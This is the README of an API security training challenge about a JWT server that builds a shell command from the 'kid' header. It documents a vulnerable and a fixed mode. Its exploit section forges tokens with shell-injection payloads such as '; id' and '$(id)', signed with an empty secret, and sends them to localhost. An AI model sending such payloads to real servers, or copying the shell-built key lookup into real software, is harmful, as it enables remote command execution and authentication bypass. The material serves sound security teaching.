# JWT KID Command Injection

This challenge demonstrates a JWT implementation that resolves the signing key by running a shell command built from the `kid` header: `sh -c "cat keys/<kid>.key"`, keeping whatever the command prints. Shell metacharacters in `kid` run arbitrary commands on the server, and a `kid` that makes the command print nothing turns the HMAC key into an empty string, so a token signed with an empty secret is accepted.

## How to run it

```bash
go run main.go serve
```

The server needs `sh`: the Docker image is based on Alpine for that reason.

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: kid is concatenated into a shell command
go run main.go serve --vulnerable=true

# fixed: kid must match ^[A-Za-z0-9_-]+$ and the key file is read without a shell
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
TOKEN=$(go run main.go jwt)

# one forged token per shell payload ("; id", "$(id)", "`id`", "| id", "&& id", ...), signed with an empty secret
jwtop exploit kidinjection "$TOKEN" --mode command --all | while read -r FORGED; do
  curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080 -H "Authorization: Bearer $FORGED"
done
# vulnerable -> 204 for every payload whose command prints nothing, fixed -> 401 for all
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
